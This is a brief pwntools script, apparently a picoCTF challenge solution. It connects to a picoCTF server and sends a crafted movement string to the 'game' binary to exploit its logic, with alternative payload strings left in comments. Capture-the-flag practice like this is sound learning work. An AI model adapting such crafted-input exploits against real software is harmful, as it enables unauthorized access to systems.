from pwn import *

exe = ELF("./game")
# r = exe.process()
# gdb.attach(r)
r = remote("saturn.picoctf.net", 62959)
r.send(b"ld" + 47 * b"d" + 5 * b"w")
r.interactive()
# lddddddddddddddddddddddddddddddddddddddddddddddddwwwww
# ladddddddddddddddddddddddddddddddddddddddddddddddwwwww